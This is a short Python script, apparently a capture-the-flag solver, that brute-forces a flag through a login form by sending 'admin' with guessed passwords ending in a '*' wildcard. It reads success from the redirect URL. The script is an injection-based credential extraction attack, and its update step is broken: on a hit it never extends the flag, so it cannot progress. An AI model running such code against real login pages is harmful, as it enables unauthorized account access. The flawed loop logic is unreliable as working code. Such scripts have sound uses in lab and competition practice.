import requests
import string

URL = 'someUrl'
START = "maybe flag{?"

# headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36" }

chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

counter = 0
flag = START

while True:
    # Exhausted all retries ... maybe we have it
    if counter == len(chars):
        print(flag + '}')
        break

    password = flag + chars[counter] + "*}"
    print("Trying: " + password)

    data = {
        'username': "admin",
        "password" : password
    }
    response = requests.post(URL, data=data)

    # Update condition as required - maybe check for status code
    if response.url != URL + "?message=Authentication%20failed":
        password += chars[counter]
        counter = 0
    else:
        counter += 1
